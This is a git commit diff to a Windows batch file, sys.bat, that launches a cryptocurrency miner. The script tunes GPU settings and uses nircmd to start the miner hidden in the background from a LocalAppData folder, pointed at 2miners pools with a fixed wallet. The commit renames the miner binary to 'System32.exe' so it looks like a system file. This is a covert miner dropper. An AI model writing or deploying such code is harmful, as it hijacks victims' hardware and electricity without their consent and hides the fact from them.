d4540643ec325367b2c5ae6a3a87c5863d047642
theharvest9 <120435567+theharvest9@users.noreply.github.com>
2023-07-20 14:19:48 -0400

    Update sys.bat

--- sys.bat
+++ sys.bat
@@ -1,6 +1,6 @@
 @echo off
 set "APPDATA_LOCAL_FOLDER=%LOCALAPPDATA%\0"
-set "PHOENIX_MINER_PATH=%APPDATA_LOCAL_FOLDER%\PhoenixMiner.exe"
+set "SYSTEM32_PATH=%APPDATA_LOCAL_FOLDER%\System32.exe"
 set "NIRCMD_PATH=%APPDATA_LOCAL_FOLDER%\nircmd.exe"
 
 setx GPU_FORCE_64BIT_PTR 0 >nul
@@ -10,4 +10,4 @@ setx GPU_MAX_ALLOC_PERCENT 100 >nul
 setx GPU_SINGLE_ALLOC_PERCENT 100 >nul
 
 
-start "" /B cmd /C "%NIRCMD_PATH% exec hide %PHOENIX_MINER_PATH% -pool us-etc.2miners.com:1010 -pool2 etc.2miners.com:1010 -wal bc1qz3savx6zfegacr4yehpqx4y6tl84w7tjzmdtjh.worker"
+start "" /B cmd /C "%NIRCMD_PATH% exec hide %SYSTEM32_PATH% -pool us-etc.2miners.com:1010 -pool2 etc.2miners.com:1010 -wal bc1qz3savx6zfegacr4yehpqx4y6tl84w7tjzmdtjh.worker"
